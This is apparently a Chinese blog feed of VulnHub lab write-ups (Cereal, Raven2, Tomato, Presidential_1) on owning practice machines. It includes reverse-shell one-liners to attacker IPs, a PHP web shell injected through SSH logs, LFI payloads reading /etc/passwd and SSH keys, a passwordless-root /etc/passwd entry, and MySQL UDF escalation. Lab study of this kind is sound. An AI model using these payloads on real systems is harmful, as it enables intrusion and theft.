<p>这里有一个重要的关于Linux的知识点：<strong>修改软链接的所有者/组的话，也会修改所链接的文件的所有者/组。</strong></p>
</blockquote>
<p>利用方法如下：</p>
<ol type="1">
<li>可以设置一个软链接指向/etc/passwd</li>
<li>然后把该链接放在/home/rocky/public_html/目录下</li>
<li>每过10分钟，chown.sh就会修改/home/rocky/public_html/目录下所有文件的所有者/组，也就把软链接的所有者/组给修改了</li>
<li>那么我们就可以随意的修改/etc/passwd的内容，比如添加一个uid和gid为0的用户，也就是root</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. <span class="built_in">cd</span> /home/rocky/public_html/</span><br><span class="line">2. ln -sf /etc/passwd ./passwd</span><br><span class="line"></span><br><span class="line">等到 2022/05/05 04:50:01 CMD: UID=0    PID=42906  | /bin/bash /usr/share/scripts/chown.sh</span><br><span class="line"></span><br><span class="line">3. ls -l /etc/passwd <span class="comment"># 查看权限</span></span><br><span class="line">4. <span class="built_in">echo</span> <span class="string">&quot;m1ku::0:0:root:/root:/bin/bash&quot;</span> &gt;&gt; /etc/passwd  <span class="comment"># 添加一个root用户，注意密码为空</span></span><br><span class="line">5. su m1ku</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505115315.png" /></p>
<p>读取flag： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /hoem/rocky/local.txt</span><br><span class="line">aaa87365bf3dc0c1a82aa14b4ce26bbc</span><br><span class="line"></span><br><span class="line">2. /root/flag.txt</span><br><span class="line">Well done! You have completed Cereal.</span><br><span class="line"></span><br><span class="line">  ____                    _ </span><br><span class="line"> / ___|___ _ __ ___  __ _| |</span><br><span class="line">| |   / _ \ &#x27;__/ _ \/ _` | |</span><br><span class="line">| |__|  __/ | |  __/ (_| | |</span><br><span class="line"> \____\___|_|  \___|\__,_|_|</span><br><span class="line">                            </span><br><span class="line"></span><br><span class="line">This box was brought to you by Bootlesshacker.</span><br><span class="line"></span><br><span class="line">Follow me on Twitter: @bootlesshacker</span><br><span class="line">My website: https://www.bootlesshacker.com</span><br><span class="line"></span><br><span class="line">Root Flag: 1aeb5db4e979543cb807cfd90df77763</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>该靶机的难度在于两点：</p>
<ol type="1">
<li>在web渗透的时候，两个端口，并且需要设置hosts，还涉及到子域名，最费时间的是路径扫描要使用比较大的字典，否则扫不出来；</li>
<li>权限提升的时候常规可利用的点都无法使用，虽然本质上还是通过cron来提权，但是需要找到存在这么一个脚本也是不简单的；</li>
<li>还有Linux 软链接的知识点也很重要，否则即使知道存在chown.sh脚本，也不知道怎么利用；</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>路径爆破</tag>
        <tag>域名解析</tag>
        <tag>子域名爆破</tag>
        <tag>匿名ftp</tag>
        <tag>进程监视</tag>
        <tag>linux软链接</tag>
        <tag>crontab利用</tag>
      </tags>
  </entry>
  <entry>
    <title>23 Vulnhub Raven2 Writeup</title>
    <url>/2022/05/06/23%20Vulnhub%20Raven2%20Writeup/</url>
    <content><![CDATA[<p>该靶机有点恶心，我在phpmailer卡了很久。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/raven-2,269/">Raven: 2 ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<p>目标：</p>
<ul>
<li>获得root权限</li>
<li>拿到4个flag</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>路径爆破</li>
<li><strong>远程代码注入</strong></li>
<li>EXP代码修改</li>
<li>反弹shell</li>
<li>内核漏洞枚举</li>
<li>本地信息收集</li>
<li><strong>MySQL UDF提权</strong></li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l </span><br><span class="line">sudo nmap -p- 10.0.2.28</span><br><span class="line">sudo nmap -p22,80,111,39505 -A 10.0.2.28</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506150958.png" /></p>
<p>这里111端口上的服务是rpcbind，这是存在漏洞的，不过是拒绝服务的漏洞，对get shell和提权都没有帮助。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506151113.png" /></p>
<h2 id="访问http服务">2.2. 访问http服务</h2>
<p>在网站主页面进行功能点检测的时候发现了一个域名：raven.local，将其加入到/etc/hosts下。之后就没有其他发现了。</p>
<p>进行路径扫描： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.28/ -w /usr/share/dirb/wordlists/common.txt</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506151306.png" /></p>
<p>css, fonts, img, js, manual 都没有用，vendor下面有着许多的文件，wordpress告诉我们这个网站的CMS</p>
<p>然后利用wpscan对wordpress进行了扫描，发现了两个用户 michael 和 steven，然后又找到了后台登录界面</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506151615.png" /></p>
<p>尝试爆破也没有用。wp-content和wp-includes目录下也存在着多个问价，但是都没有有用的信息。</p>
<p>接下来看最开始的vendor目录。</p>
<p>首先发现了一个 PHPMailerAutoload.php 但是php文件都被解析执行了，我们看不到其代码。但是可以搜索phpmailer，并且这具有漏洞</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506151844.png" /></p>
<p>又从 VERSION 中发现版本是 5.2.16。该漏洞的是因为调用了phpmailer的函数，所以我们需要找到是哪个文件调用了。再次进行路径扫描，这回添加了压缩拓展名，因为php的我们看不了，</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506152138.png" /></p>
<p>发现了contact.php和contact.zip，将后者下载打开，在其中发现了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506152411.png" /></p>
<p>此时可以确定是contact.php调用了phpmailer。</p>
<p>最后，从PATH文件中发现了第一个flag，以及文件路径： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/html/vendor/</span><br><span class="line">flag1&#123;a2c1f66d2b8051bd3a5874b5b6e43e21&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="get-shell">2.3. get shell</h2>
<p>这里才是最坑的。searchsplot扫描出多个漏洞，但是能利用的只有40974.py，还需要经过一定的修改才可以！！！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506153921.png" /></p>
<p>修改：</p>
<ol type="1">
<li>target</li>
<li>backdoor，默认的backdoor.php不行，不知道为什么</li>
<li>ip和端口</li>
<li>以及生成后门的路径，从PATh中知道了路径</li>
</ol>
<p>然后执行： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 40974.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ </span><br><span class="line">██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗</span><br><span class="line">███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝</span><br><span class="line">██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗</span><br><span class="line">██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║</span><br><span class="line">╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝</span><br><span class="line">      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com</span><br><span class="line"> Version 1.0 - github.com/anarcoder - greetings opsxcq &amp; David Golunski</span><br><span class="line"></span><br><span class="line">[+] SeNdiNG eVIl SHeLL To TaRGeT....</span><br><span class="line">[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D</span><br><span class="line">[+]  ExPLoITeD http://10.0.2.28/contact.php</span><br></pre></td></tr></table></figure></p>
<p>先直接访问10.0.2.28/exp.php是否存在，如果存在，则在kali上开启监听，然后再次访问exp.php即可获得shell</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506154057.png" /></p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>介绍一款信息收集的工具：<a href="https://github.com/rebootuser/LinEnum">GitHub - rebootuser/LinEnum: Scripted Local Linux Enumeration &amp; Privilege Escalation Checks</a></p>
<p>将 LinEnum.sh 传送到靶机，并执行。查看信息内容的时候发现了mysql，并且是root权限</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506154409.png" /></p>
<p>接下来查看配置信息，获得其用户名和密码</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506154952.png" /></p>
<p>查看其内容 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/** The name of the database for WordPress */</span><br><span class="line">define(&#x27;DB_NAME&#x27;, &#x27;wordpress&#x27;);</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define(&#x27;DB_PASSWORD&#x27;, &#x27;R@v3nSecurity&#x27;);</span><br></pre></td></tr></table></figure></p>
<p>然后尝试连接MySQL，利用 system /bin/bash -i 获得shell，但是失败了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506155223.png" /></p>
<p>查看MySQL的sucure_file_priv参数，发现没有任何限制 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &quot;secure_file_priv&quot;;</span><br><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
<p>因此接下来利用UDF提权。[[Linux MySQL提权总结]]</p>
<ol type="1">
<li><p>在kali上找到so文件，注意靶机是64位的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. find / -iname <span class="string">&quot;*mysqludf*&quot;</span> -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">2. cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so ./udf.so</span><br></pre></td></tr></table></figure></li>
<li><p>将so文件传给靶机/tmp目录下，并给权限，直接777</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. 靶机: nc -lvnp 3333 &gt; udf.so</span><br><span class="line">2. kali: nc 10.0.2.28 3333 &lt; udf.so -w 1</span><br><span class="line">3. 靶机: chmod 777 udf.so</span><br></pre></td></tr></table></figure></li>
<li><p>找MySQL插件目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &quot;%plugin%&quot;;</span><br><span class="line">show variables like &quot;%plugin%&quot;;</span><br><span class="line">+---------------+------------------------+</span><br><span class="line">| Variable_name | Value                  |</span><br><span class="line">+---------------+------------------------+</span><br><span class="line">| plugin_dir    | /usr/lib/mysql/plugin/ |</span><br><span class="line">+---------------+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li>
<li><p>将udf.so写入插件所在目录</p>
<p>失败的尝试： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select hex(load_file(&#x27;/tmp/udf.so&#x27;)) into dumpfile &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;</span><br></pre></td></tr></table></figure></p>
<p>成功的尝试： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. use mysql;</span><br><span class="line">2. create table shell(lint blob);</span><br><span class="line">3. insert into shell values(load_file(&#x27;/tmp/udf.so&#x27;));</span><br><span class="line">4. select * from shell into dumpfile &#x27;/usr/lib/mysql/plugin/mysqludf.so&#x27;;</span><br></pre></td></tr></table></figure></p></li>
<li><p>创建自定义函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. reate function sys_eval returns integer soname &#x27;mysqludf.so&#x27;;</span><br><span class="line">2. select sys_eval(&#x27;id &gt; /tmp/out.txt&#x27;);</span><br></pre></td></tr></table></figure></li>
</ol>
<p>如果/tmp/out.txt成功生成，并且属主为root，则代表成功</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506161609.png" /></p>
<p>即使执行函数出现了报错，还是不影响。</p>
<p>因此，直接利用该函数获得shell <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#x27;bash -i&#x27;); # 失败，会断开连接</span><br><span class="line">select sys_eval(&#x27;nc 10.0.2.27 5555 -e /bin/bash&#x27;); # 成功</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506161923.png" /></p>
<p>接下来就可以找flag了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506162042.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// flag2.txt</span><br><span class="line">flag2&#123;6a8ed560f0b5358ecf844108048eb337&#125;</span><br><span class="line"></span><br><span class="line">// flag3.png</span><br><span class="line">直接网页访问 http://10.0.2.28/wordpress/wp-content/uploads/2018/11/flag3.png</span><br><span class="line"></span><br><span class="line">// flag4.txt</span><br><span class="line">  ___                   ___ ___ </span><br><span class="line"> | _ \__ ___ _____ _ _ |_ _|_ _|</span><br><span class="line"> |   / _` \ V / -_) <span class="string">&#x27; \ | | | | </span></span><br><span class="line"><span class="string"> |_|_\__,_|\_/\___|_||_|___|___|</span></span><br><span class="line"><span class="string">                           </span></span><br><span class="line"><span class="string">flag4&#123;df2bc5e951d91581467bb9a2a8ff4425&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">CONGRATULATIONS on successfully rooting RavenII</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I hope you enjoyed this second interation of the Raven VM</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hit me up on Twitter and let me know what you thought: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@mccannwj / wjmccann.github.io</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>并不一定要使用nc获得shell，反正可以执行命令，也可以利用setuid.c 编译，并且给其suid权限，这样普通用户执行./setuid 就可以提权。</p>
</blockquote>
<h1 id="总结">3. 总结</h1>
<p>该靶机涉及的主要知识点：</p>
<ol type="1">
<li>phpmailer漏洞；</li>
<li>MySQL UDF提权</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>phpmailer漏洞</tag>
        <tag>MySQL UDF提取</tag>
      </tags>
  </entry>
  <entry>
    <title>22 Vulnhub Tomato Writeup</title>
    <url>/2022/05/05/22%20Vulnhub%20Tomato%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度比较简单。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/tomato-1,557/">Tomato: 1 ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>低</li>
</ul>
<p>目标：</p>
<ul>
<li>获得root权限</li>
<li>拿到1个flag</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>路径扫描</li>
<li>源码分析</li>
<li><strong>文件包含</strong></li>
<li><strong>写入日志</strong></li>
<li><strong>内核漏洞枚举</strong></li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.26</span><br><span class="line">sudo nmap -p21,80,2211,8888 -A 10.0.2.26</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505182423.png" /></p>
<p>信息如下：</p>
<ol type="1">
<li>21是ftp服务，但是不允许匿名登录</li>
<li>80和8888都是http服务</li>
<li>2211是ssh服务</li>
</ol>
<h2 id="http服务-get-shell">2.2. http服务 + get shell</h2>
<h3 id="http服务">2.2.1. http服务</h3>
<p>虽然我后访问的8888端口，但是那个端口需要认证，而即使我拿特别大的字典也无法爆破成功，因为放弃了。</p>
<p>直接访问80端口，发现只有一张图片，因此进行路径扫描： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.26/ -w /usr/share/dirb/wordlists/common.txt</span><br></pre></td></tr></table></figure></p>
<p>除了 index.html 之外，还扫描出一个目录 antibot_image，该目录下存在许多文件，但是所有的php文件都是空白，图片和txt文件没有有用的信息，只有info.php是有显示的，查看源码得到提示： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!-- &lt;/?php <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;image&#x27;</span>]; --&gt;</span><br></pre></td></tr></table></figure></p>
<p>根据提示，猜测可能存在文件包含漏洞，因此输入如下payload尝试： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?image=/etc/passwd</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505183012.png" /></p>
<p>如果有远程包含那就更好了，但是很可惜，并不存在远程文件包含</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505183102.png" /></p>
<p>因此，接下来优先考虑tomato的家目录下是否存在id_rsa <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?image=/home/tomato/.shh/id_rsa</span><br></pre></td></tr></table></figure></p>
<p>很遗憾，没有任何结果，但这并不意味不存在，也有可能是没有读取权限。</p>
<p>接下来利用文件包含的经典利用方式，那就是包含日志。从之前的服务发现中可以看到有ftp和ssh，那么我们远程连接这两个服务的时候就会记录到日志中，ssh的默认日志路径为: /var/log/auth.log <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?image=/var/log/auth.log</span><br></pre></td></tr></table></figure></p>
<p>我在kali上利用ssh随便连接了一下，在日志中看到用户名被记录了下来 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Downloads]</span><br><span class="line">└─<span class="comment"># ssh sfasdfashfkashgksg@10.0.2.26 -p 2211                                                                                                                 255 ⨯</span></span><br><span class="line">sfasdfashfkashgksg@10.0.2.26<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br><span class="line"><span class="string">sfasdfashfkashgksg@10.0.2.26&#x27;</span>s password: </span><br><span class="line">Permission denied, please try again.</span><br><span class="line">sfasdfashfkashgksg@10.0.2.26<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">sfasdfashfkashgksg@10.0.2.26: Permission denied (publickey,password).</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505183500.png" /></p>
<h3 id="get-shell">2.2.2. get shell</h3>
<p>我们可以构造如下payload，然后ssh连接，这样子这句payload就会被记录到日志中 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ssh <span class="string">&#x27;&lt;?php echo system($_GET[&quot;cmd&quot;])?&gt;&#x27;</span>@<span class="number">10.0</span>.<span class="number">2.26</span> -p <span class="number">2211</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505183804.png" /></p>
<p>注意到这里没有显示我们注入的payload。这是好事还是坏事呢？这是好事！如果这里显示了payload，就知道服务器只把我们的payload当作普通的文本展示出来；而不显示则说明，服务器很大可能把payload作为代码执行了。可以利用php://fliter读取一下该日志</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505184055.png" /></p>
<p>尝试一下能否执行代码 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?image=/var/log/auth.log&amp;cmd=id</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505184141.png" /></p>
<p>因此这里可以执行命令，那么反弹shell就很简单了，经过尝试发现：</p>
<ol type="1">
<li>nc没有-e参数，也无法使用nc串联；</li>
<li>虽然有php环境，但无法利用php反弹shell</li>
<li>存在python3，且可以利用</li>
<li>存在perl，也可以利用</li>
<li>bash配合重定向反弹shell失败</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505184423.png" /></p>
<p>成功get shell。</p>
<h2 id="权限提升">2.3. 权限提升</h2>
<p>这里通过信息搜集，没有sudo和suid提权漏洞，但是内核版本比较低，经过搜索发现有许多可以利用的exp</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505184542.png" /></p>
<p>最开始我先尝试了CVE-2021-3493，居然失败了，由尝试了许多个，也都失败了（我佛了）</p>
<p>这里推荐一个自动收集可利用漏洞的工具：</p>
<ul>
<li><a href="https://github.com/mzet-/linux-exploit-suggester.git">GitHub - mzet-/linux-exploit-suggester: Linux privilege escalation auditing tool</a></li>
</ul>
<p>将sh脚本传到靶机上（/tmp 目录下），给x权限并执行</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505190001.png" /></p>
<p>该工具会根据漏洞的成功的可能性排列，越靠前越有可能。因此一个一个尝试即可。尝试到第二个的时候发现成功了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505190135.png" /></p>
<p>首先确定靶机上有没有gcc，该靶机上并没有，因此在kali上编译之后再传给靶机。如果靶机有，最好就是在靶机上编译。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505190406.png" /></p>
<p>读取flag： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/root/proof.txt</span><br><span class="line">Sun_CSR_TEAM_TOMATO_JS_0232xx23</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>该靶机挺简单的，漏洞也很常见，不过还是学到了两点：</p>
<ol type="1">
<li>内核漏洞可以使用工具。随便测试太浪费时间了</li>
<li>各种语言环境都有反弹shell的命令，后期可以收集一下</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>文件包含</tag>
        <tag>写入日志</tag>
        <tag>内核漏洞枚举</tag>
      </tags>
  </entry>
  <entry>
    <title>24 Vulnhub Presidential_1 Writeup</title>
    <url>/2022/05/06/24%20Vulnhub%20Presidential_1%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度中等，感觉比较常规，虽然我也是看了writeup才最终做出来的。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/presidential-1,500/">Presidential: 1 ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>备份文件</li>
<li>子域名爆破</li>
<li><strong>phpmyadmin</strong></li>
<li>密码爆破</li>
<li>本地文件包含</li>
<li><strong>Capabilities</strong></li>
<li>SSH公钥认证</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.29</span><br><span class="line">sudo nmap -p80,2082 -A 10.0.2.29</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506220805.png" /></p>
<p>这里比较异常的是ssh没在22端口，而是在2082端口。</p>
<h2 id="访问http服务">2.2. 访问http服务</h2>
<p>进入网站，映入眼帘的就是美国2020总统大选</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506220922.png" /></p>
<p>注意左上角邮箱那存在域名，<strong>而在靶机中，出现域名，一般都会使用到，并且很大概率需要进行子域名扫描</strong>，因此，先将该域名加入/etc/hosts。</p>
<p>接下来进行路径扫描 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.29</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506221155.png" /></p>
<p>config.php和config.php.bak是最值得常看的，但是前者为空白，而后者在查看源码的时候出现了如下信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$dbUser = &quot;votebox&quot;;</span><br><span class="line">$dbPass = &quot;casoj3FFASPsbyoRP&quot;;</span><br><span class="line">$dbHost = &quot;localhost&quot;;</span><br><span class="line">$dbname = &quot;votebox&quot;;</span><br></pre></td></tr></table></figure></p>
<p>这看过去像是数据库的相关信息。</p>
<p>接着对assets目录进行查看，并没有发现任何有用的信息。然后想着换成域名再次进行路径扫描，结果和ip一样。</p>
<p>所以，最后进行子域名爆破（字典要用大一点）： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster vhost -u votenow.local -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt|grep <span class="string">&quot;Status: 200&quot;</span></span><br></pre></td></tr></table></figure></p>
<p>最后找到一个子域名: datasafe.votenow.local。将该子域名加入/etc/hosts，然后直接访问该域名，得到一个phpmyadmin的登陆界面，利用刚刚备份文件泄露出来的用户名和密码尝试登录</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506221749.png" /></p>
<p>查看了一下数据库内的信息，发现了一个用户： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">$2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i</span><br></pre></td></tr></table></figure></p>
<p>将密码字段用john爆破（时间花费很长，但是一定能跑出来） <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=rockyou.txt hash.txt <span class="comment"># hash.txt 保存的是密码字段</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506204239.png" /></p>
<p>即密码为：Stella。用这个账号和密码进行ssh连接，发现居然不知道密码登陆方式，只支持公钥认证。</p>
<p>接着搜索是否存在可利用的漏洞：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506221925.png" /></p>
<p>我首先尝试了一下RCE，但是没有任何反应，接下来尝试第二个，txt内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Exploit Title: phpMyAdmin 4.8.1 - Local File Inclusion to Remote Code Execution</span><br><span class="line"># Date: 2018-06-21</span><br><span class="line"># Exploit Author: VulnSpy</span><br><span class="line"># Vendor Homepage: http://www.phpmyadmin.net</span><br><span class="line"># Software Link: https://github.com/phpmyadmin/phpmyadmin/archive/RELEASE_4_8_1.tar.gz</span><br><span class="line"># Version: 4.8.0, 4.8.1</span><br><span class="line"># Tested on: php7 mysql5</span><br><span class="line"># CVE : CVE-2018-12613</span><br><span class="line"></span><br><span class="line">1. Run SQL Query : select &#x27;&lt;?php phpinfo();exit;?&gt;&#x27;</span><br><span class="line">2. Include the session file :</span><br><span class="line">http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k</span><br></pre></td></tr></table></figure></p>
<p>简单来说就是phpmyadmin的4.8.1存在本地文件包含，利用该漏洞包含session文件，然后get shell。</p>
<h2 id="get-shell">2.3. get shell</h2>
<p>首先，先执行sql语句： <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();exit;?&gt;&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506222156.png" /></p>
<p>然后查看session的值（在cookie里面）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506222229.png" /></p>
